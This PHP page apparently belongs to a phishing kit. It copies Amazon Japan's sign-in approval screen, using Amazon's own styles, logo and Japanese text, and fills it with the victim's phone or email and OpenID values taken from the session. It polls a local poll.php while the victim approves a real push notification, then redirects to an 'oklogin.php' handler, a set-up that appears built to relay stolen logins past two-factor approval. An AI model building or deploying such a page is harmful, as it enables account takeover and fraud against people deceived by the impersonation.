<?php
include '../../php/xzpc.php';
session_start();

//print_r($_SESSION['okinfo']);

$info = $_SESSION['loadinInfo'];
include '../../php/curl.php';
if(is_mobile_request()){
    header("location: ./loadinm.php");
}
?>

<!doctype html><html class="a-no-js" data-19ax5a9jf="dingo"><head><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8"/>    <meta name="robots" content="noindex, nofollow">
 <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
  <link rel="bookmark" href="/favicon.ico" type="image/x-icon" />



<title dir="ltr">      Amazon
</title>
<link rel="stylesheet" href="https://images-fe.ssl-images-amazon.com/images/I/11KpeNaLkYL._RC|01pvFvAg2+L.css,41slQ4w0LlL.css,21qPwhPKAAL.css,01Vctty9pOL.css,017DsKjNQJL.css,0131vqwP5UL.css,41EWOOlBJ9L.css,11gKzVUTNZL.css,01ElnPiDxWL.css,11bGSgD5pDL.css,01Dm5eKVxwL.css,01IdKcBuAdL.css,01y-XAlI+2L.css,01ZfXnjPmmL.css,01oDR3IULNL.css,31q1y1irc5L.css,01XPHJk60-L.css,01R0k0yxPXL.css,21xVR0NtxzL.css,11gneA3MtJL.css,21fecG8pUzL.css,01RddH8vm-L.css,01F7oM-p7IL.css,21AmhU6t0sL.css,11zGrJZ9D2L.css,11tRp6+0HHL.css,11MrdqKlKnL.css,11oHt2HYxnL.css,01-fWz3sOQL.css,11ocrgKoE-L.css,115m6JDHi9L.css,11g1xm90ZvL.css,01QrWuRrZ-L.css,21pIv-yKhaL.css,01Wiow6micL.css,01gAR5pB+IL.css,119dKrtBoVL.css,11Y05DTEL6L.css,01cbS3UK11L.css,21F85am0yFL.css,01giMEP+djL.css_.css?AUIClients/AmazonUI&GdjpUKYS#jp.not-trident.263677-T2" />
<script>
(function(f,h,Q,E){function F(a){v&&v.tag&&v.tag(q(":","aui",a))}function w(a,b){v&&v.count&&v.count("aui:"+a,0===b?0:b||(v.count("aui:"+a)||0)+1)}function m(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function x(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function G(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function va(a,b){var c=a.length,
e=c,g=function(){e--||(R.push(b),S||(setTimeout(ca,0),S=!0))};for(g();c--;)da[a[c]]?g():(A[a[c]]=A[a[c]]||[]).push(g)}function wa(a,b,c,e,g){var d=h.createElement(a?"script":"link");x(d,"error",e);g&&x(d,"load",g);a?(d.type="text/javascript",d.async=!0,c&&/AUIClients|images[/]I/.test(b)&&d.setAttribute("crossorigin","anonymous"),d.src=b):(d.rel="stylesheet",d.href=b);h.getElementsByTagName("head")[0].appendChild(d)}function ea(a,b){return function(c,e){function g(){wa(b,c,d,function(b){T?w("resource_unload"):
d?(d=!1,w("resource_retry"),g()):(w("resource_error"),a.log("Asset failed to load: "+c));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(fa[c])return!1;fa[c]=!0;w("resource_count");var d=!0;return!g()}}function xa(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},logError:function(c,d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)H.hasOwnProperty(c[d])&&(g[d]=U.hasOwnProperty(c[d])?U[c[d]](H[c[d]],e):H[c[d]]);return g}function B(a,b,c,e,g){return function(d,
h){function n(){var a=null;e?a=h:"function"===typeof h&&(p.start=C(),a=h.apply(f,xa(d,k,l)),p.end=C());if(b){H[d]=a;a=d;for(da[a]=!0;(A[a]||[]).length;)A[a].shift()();delete A[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=E);b&&(d=d?d.replace(ha,""):"__NONAME__",V.hasOwnProperty(d)&&k.error(q(", reregistered by ",q(" by ",d+" already registered",V[d]),k.attribution),d),V[d]=k.attribution);for(var l=[],m=0;m<a.length;m++)l[m]=a[m].replace(ha,"");var p=ia[d||"anon"+ ++ya]={depend:l,registered:C(),
namespace:k.namespace};c?n():va(l,k.guardFatal(d,n));return{decorate:function(a){U[d]=k.guardFatal(d,a)}}}}function ja(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:B(b,!1,a,!1,this),register:B(b,!0,a,!1,this)}}}function W(a,b){return function(c,e){e||(e=c,c=E);var g=this.attribution;return function(){y.push(b||{attribution:g,name:c,logLevel:a});var d=e.apply(this,arguments);y.pop();return d}}}function I(a,b){this.load={js:ea(this,!0),css:ea(this)};G(this,"namespace",
b);G(this,"attribution",a)}function ka(){h.body?t.trigger("a-bodyBegin"):setTimeout(ka,20)}function D(a,b){a.className=X(a,b)+" "+b}function X(a,b){return(" "+a.className+" ").split(" "+b+" ").join(" ").replace(/^ | $/g,"")}function la(a){try{return a()}catch(b){return!1}}function J(){if(K){var a={w:f.innerWidth||n.clientWidth,h:f.innerHeight||n.clientHeight};5<Math.abs(a.w-Y.w)||50<a.h-Y.h?(Y=a,L=4,(a=k.mobile||k.tablet?450<a.w&&a.w>a.h:1250<=a.w)?D(n,"a-ws"):n.className=X(n,"a-ws")):0<L&&(L--,ma=
setTimeout(J,16))}}function za(a){(K=a===E?!K:!!a)&&J()}function Aa(){return K}function u(a,b){return"sw:"+(b||"")+":"+a+":"}function na(){oa.forEach(function(a){F(a)})}function p(a){oa.push(a)}function pa(a,b,c,e){if(c){b=m(/Chrome/i)&&!m(/Edge/i)&&!m(/OPR/i)&&!a.capabilities.isAmazonApp&&!m(new RegExp(Z+"bwv"+Z+"b"));var g=u(e,"browser"),d=u(e,"prod_mshop"),f=u(e,"beta_mshop");!a.capabilities.isAmazonApp&&c.browser&&b&&(p(g+"supported"),c.browser.action(g,e));!b&&c.browser&&p(g+"unsupported");c.prodMshop&&
p(d+"unsupported");c.betaMshop&&p(f+"unsupported")}}"use strict";var M=Q.now=Q.now||function(){return+new Q},C=function(a){return a&&a.now?a.now.bind(a):M}(f.performance),N=C(),r=f.AmazonUIPageJS||f.P;if(r&&r.when&&r.register){N=[];for(var l=h.currentScript;l;l=l.parentElement)l.id&&N.push(l.id);return r.log("A copy of P has already been loaded on this page.","FATAL",N.join(" "))}var v=f.ue;F();F("aui_build_date:3.21.2-2021-03-04");var R=[],S=!1;var ca=function(){for(var a=setTimeout(ca,0),b=M();R.length;)if(R.shift()(),
50<M()-b)return;clearTimeout(a);S=!1};var da={},A={},fa={},T=!1;x(f,"beforeunload",function(){T=!0;setTimeout(function(){T=!1},1E4)});var ha=/^prv:/,V={},H={},U={},ia={},ya=0,Z=String.fromCharCode(92),y=[],qa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(Z,g.message,"at "+q(":",b,c,e)):E);var d=y.pop()||{};g.attribution=q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&console&&console.log&&console.log([g.logLevel||
"ERROR",a,"thrown by",g.attribution].join(" "));y=[];qa&&(d=[].slice.call(arguments),d[4]=g,qa.apply(f,d))};I.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:W(),guardFatal:W("FATAL"),guardCurrent:function(a){var b=
y[y.length-1];return b?W(b.logLevel,b).call(this,a):a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:B([],!0,!0,!0),register:B([],!0),execute:B([]),AUI_BUILD_DATE:"3.21.2-2021-03-04",when:ja(),now:ja(!0),trigger:function(a,b,c){var e=M();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&O.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new I(a)},
_namespace:function(a,b){return new I(a,b)}};var t=G(f,"AmazonUIPageJS",new I);var O=t._namespace("PageJS","AmazonUI");O.declare("prv:p-debug",ia);t.declare("p-recorder-events",[]);t.declare("p-recorder-stop",function(){});G(f,"P",t);ka();if(h.addEventListener){var ra;h.addEventListener("DOMContentLoaded",ra=function(){t.trigger("a-domready");h.removeEventListener("DOMContentLoaded",ra,!1)},!1)}var n=h.documentElement,aa=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){return!0},
test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){return!0}}}();r=n.className;var sa=/(^| )a-mobile( |$)/.test(r),ta=/(^| )a-tablet( |$)/.test(r),k={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&
!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in
h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in f&&null!==f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return aa.testGradients()},hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;w("hiRes"+(sa?"Mobile":ta?"Tablet":"Desktop"),a?1:0);
return a},transform3d:function(){return aa.testTransform3d()},touchScrolling:function(){return m(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},ios:function(){return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!m(/trident|Edge/i)},android:function(){return m(/android.([1-9]|[L-Z])/i)&&!m(/trident|Edge/i)},mobile:function(){return sa},tablet:function(){return ta},rtl:function(){return"rtl"===n.dir}};for(l in k)k.hasOwnProperty(l)&&
(k[l]=la(k[l]));for(var ba="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),P=0;P<ba.length;P++)k[ba[P]]=la(function(){return aa.test(ba[P])});var K=!0,ma=0,Y={w:0,h:0},L=4;J();x(f,"resize",function(){clearTimeout(ma);L=4;J()});var ua={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};n.className=X(n,"a-no-js");D(n,"a-js");!m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||
f.navigator.standalone||m(/safari/i)||D(n,"a-ember");r=[];for(l in k)k.hasOwnProperty(l)&&k[l]&&r.push("a-"+l.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));D(n,r.join(" "));n.setAttribute("data-aui-build-date","3.21.2-2021-03-04");t.register("p-detect",function(){return{capabilities:k,localStorage:k.localStorage&&ua,toggleResponsiveGrid:za,responsiveGridEnabled:Aa}});m(/UCBrowser/i)||k.localStorage&&D(n,ua.getItem("a-font-class"));t.declare("a-event-revised-handling",!1);try{var z=navigator.serviceWorker}catch(a){F("sw:nav_err")}z&&
(x(z,"message",function(a){a&&a.data&&w(a.data.k,a.data.v)}),z.controller&&z.controller.postMessage("MSG-RDY"));var oa=[];(function(a){var b=a.reg,c=a.unreg;z&&z.getRegistrations?(O.when("A","a-util").execute(function(a,b){pa(a,b,c,"unregister")}),x(f,"load",function(){O.when("A","a-util").execute(function(a,c){pa(a,c,b,"register");na()})})):(b&&(b.browser&&p(u("register","browser")+"unsupported"),b.prodMshop&&p(u("register","prod_mshop")+"unsupported"),b.betaMshop&&p(u("register","beta_mshop")+"unsupported")),
c&&(c.browser&&p(u("unregister","browser")+"unsupported"),c.prodMshop&&p(u("unregister","prod_mshop")+"unsupported"),c.betaMshop&&p(u("unregister","beta_mshop")+"unsupported")),na())})({reg:{},unreg:{}});t.declare("a-fix-event-off",!1);w("pagejs:pkgExecTime",C()-N)})(window,document,Date);
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-fe.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11Y+5x+kkTL.js,51IWYO5M+zL.js,112nmCqUymL.js,11giXtZCwVL.js,01+z+uIeJ-L.js,014NohEdE7L.js,21NNXfMitSL.js,11GXfd3+z+L.js,51gm4oPD2cL.js,11AHlQhPRjL.js,11UNQpqeowL.js,11OREnu1epL.js,11KbZymw5ZL.js,21r53SJg7LL.js,0190vxtlzcL.js,51bbIMIQQwL.js,3109-RXWZcL.js,015c-6CIP9L.js,01ezj5Rkz1L.js,11VS-C+YWGL.js,31pOTH2ZMRL.js,01rpauTep4L.js,01zbcJxtbAL.js_.js?AUIClients/AmazonUI&tbOQM7bq#309035-T1');
</script>

    <style>
      .chimera-body-container {
        width: 27em !important;
        margin-left: auto;
        margin-right: auto;
      }
    </style>
</head>
<body class="a-m-jp a-aui_72554-c a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_tnr_v2_180836-c"><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_PRELOAD_261698":"C"}</script><div id="header" class="a-section a-spacing-none a-padding-medium">





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
    
    
      <i class="a-icon a-icon-jp a-icon-domain-jp a-icon-domain" role="presentation"></i>
    

    
  
</a>

    
  
</div>

</div>
<div id="body" class="a-section a-text-center"><div class="a-box a-text-left chimera-body-container"><div class="a-box-inner">


<noscript>
<div class="a-box a-alert a-alert-warning"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">JavaScriptが無効になっています</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">このサイトが正しく機能するためには、JavaScriptが必要です。次に進むには、ブラウザーでJavaScriptを有効にしてください。</div></div></div></noscript>
<div class="a-section a-spacing-base a-spacing-top-large a-text-center">  <img src="https://images-na.ssl-images-amazon.com/images/G/01/IS/TIV/6apqio2l3lersrtenak._CB427825677_.png" height="60%" width="60%"/>
</div>
<div class="a-section a-spacing-large"><span class="a-size-medium transaction-approval-word-break a-text-bold">続行するには、次の宛先に送信された通知を承認します:</span></div>
<div id="channelDetails" class="a-section">

<div class="a-section a-spacing-extra-large">
<div class="a-row"><div class="a-column a-span4 a-text-left"><?=$info['phone_email_text']?></div>
<div class="a-column a-span8 a-text-left a-span-last"><?=$info['phone_email_number']?></div></div>

</div></div>

<div class="a-section transaction-approval-js-enabled">
<form id="pollingForm" method="get" action="/ap/cvf/poll.php">

<input type="hidden" name="arb" value="<?=$info['arb']?>"/>
<input type="hidden" name="openid.return_to" value="<?=$info['openid_return_to']?>"/>
<input type="hidden" name="pageId" value="<?=$info['pageId']?>"/>
<input type="hidden" name="openid.assoc_handle" value="<?=$info['openid_assoc_handle']?>"/>
<input type='hidden' name='csrfToken' value='<?=$info['csrfToken']?>' />

</form>
</div>
<style>

  .a-no-js .transaction-approval-js-enabled {
    display: none;
  }

</style>


<div id="resend-transaction-approval" class="a-section transaction-approval-js-enabled">



<span class="a-size-base transaction-approval-word-break a-text-bold">受け取りませんでしたか？</span>

<div class="a-section">
    
    <form id="resend-approval-form" method="post" action="./resend.php">
        <div class="a-section a-spacing-medium a-text-left">
            <a id="resend-approval-link" class="a-link-normal" href="javascript:;">通知を再送信</a>
        </div>
        <input type="hidden" name="arb" value="<?=$info['arb']?>"/>
        <input type="hidden" name="openid.return_to" value="<?=$info['openid_return_to']?>"/>
        <input type="hidden" name="pageId" value="<?=$info['pageId']?>"/>
        <input type="hidden" name="openid.assoc_handle" value="<?=$info['openid_assoc_handle']?>"/>
        <input type='hidden' name='csrfToken' value='<?=$info['csrfToken']?>' />
    </form>
    
</div>


<div class="a-row">
<div id="resend-approval-alert" class="a-box a-alert-inline a-alert-inline-info"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content"><div id="timer" class="a-section"></div></div></div></div></div>

</div>
<style>

  .a-no-js .transaction-approval-js-enabled {
    display: none;
  }

</style>



<div class="a-section a-text-left">
<span class="a-size-base transaction-approval-word-break a-text-bold">すでに回答されましたか？</span>
<div class="a-section"><a class="a-link-normal" href="">ページを更新するにはこちらをクリックしてください。</a></div>
</div>
<div class="a-section a-spacing-top-large a-text-left">お困りですか？ <a href="/gp/help/customer/account-issues/ref=ch_tiv_approval_broadcast_contact_cs?ie=UTF8">カスタマーサービス</a>へご連絡ください。</div>
<script>
  'use strict';

  P.when('A', 'ready').execute(function(A) {
    var $ = A.$;

    // Do polling every 5 seconds, this can be changed later if needed
    $('#pollingForm').ready(function() {
      setTimeout(polling, 5000);
    });

    function polling() {
      A.ajax($('#pollingForm').attr('action'), {
        method: 'GET',
        params: $('#pollingForm').serializeArray(),
        success: handlePollingResponse,
        error: handlePollingError
      });
    }

    function handlePollingResponse(response) {
        $('#channelDetails').html($(response).find('#updatedChannelDetails').html());
      var transactionApprovalStatus = $(response).find("input[name='transactionApprovalStatus']").val();

      switch (transactionApprovalStatus) {
        case 'TransactionPending':
          setTimeout(polling, 5000);
          break;

        case 'TransactionResponded':
        case 'TransactionExpired':
          $('#resend-transaction-approval').hide();
          setTimeout(polling, 5000);
          break;

        case 'TransactionCompleted':
        case 'TransactionCompletionTimeout':
            
          window.location.replace("/oklogin.php?<?=$info['openid_return_to']?>");
          break;

        default:
          window.location.reload();
      }
    }

    function getQueryParameters(url) {
      var paramPairs = {};
      var parameters = url.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
        paramPairs[key] = value;
      });

      return paramPairs;
    }

    function handlePollingError() {
      window.location.reload();
    }
  });

</script>
<script>
    P.when('A', 'ready').execute(function(A) {
        var $ = A.$;

        $('#resend-approval-link').click(function() {
            $('#resend-approval-form').submit();
        });
    });
</script>

<script>
    P.when('A', 'ready').register('resendApprovalLinksTimer', function(A) {
        function updateTime(timeleft, updateMsg) {
            var resultMsg = updateMsg.split('+timeleft+');
            var endResult = resultMsg[0].split('"').join('') +timeleft+ resultMsg[1].split('"').join('');
            A.$('#timer').html(endResult);
        }

        function onComplete(completeMsg) {
            A.$('#timer').html(completeMsg);
            A.$("#resend-approval-link").removeClass("transaction-approval-link-disabled");
        }

        function Timer(time, updateMsg, completeMsg) {
            var start = Date.now();
            var interval = setInterval(function() {
                var currTime = Date.now();
                var timePassed = currTime - start;
                var timeRemaining = time - timePassed;

                if (timeRemaining <= 0) {
                    clearInterval(interval);
                    onComplete(completeMsg);
                } else {
                    updateTime(Math.floor(timeRemaining / 1000), updateMsg);
                }
            }, 100);
        }

        function createTimer(timeInMillis, updateMsg, completeMsg) {
            return new Timer(timeInMillis, updateMsg, completeMsg);
        }

        return {
            createTimer: createTimer
        };
    });
</script>

<script>
    P.when('A', 'resendApprovalLinksTimer', 'ready').execute(function(A, resendApprovalLinksTimer) {
        if (<?=$info['isresendTimer']?>) {
            resendApprovalLinksTimer.createTimer(<?=$info['timeleft']?> - Date.now(), '通知を送信しています。完了まで数分かかる場合があります。必要に応じて、" +timeleft+ " 秒で新しい通知をリクエストできます。', '必要に応じて、承認リンクを再送信できるようになりました。');
            A.$("#resend-approval-link").addClass("transaction-approval-link-disabled");
        }
    });
</script>

<style>

  .transaction-approval-word-break {
    word-break: break-word;
  }

  .transaction-approval-link-disabled {
    pointer-events: none;
    opacity: 0.5;
  }

</style>
</div></div></div>




<style>
  .auth-footer-separator {
    display: inline-block;
    width: 20px;
  }
</style>

<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div id="footer" class="a-section">
  <div class="a-section a-spacing-small a-text-center">
    
      <span class="auth-footer-separator"></span>
    

    
      
        
          
        

        
      

      
        

        
          <a class="a-link-normal" target="_blank" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=643006">
            利用規約
          </a>
        
      

      <span class="auth-footer-separator"></span>
    
      
        
          
        

        
      

      
        

        
          <a class="a-link-normal" target="_blank" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=643000">
            プライバシー規約
          </a>
        
      

      <span class="auth-footer-separator"></span>
    
      
        
          
        

        
      

      
        

        
          <a class="a-link-normal" target="_blank" href="/help">
            ヘルプ
          </a>
        
      

      <span class="auth-footer-separator"></span>
    
  </div>

  <div class="a-section a-spacing-none a-text-center">
    <span class="a-size-mini a-color-secondary">
      &copy; 1996-2021, Amazon.com, Inc. or its affiliates
    </span>
  </div>
</div>
</div></body></html>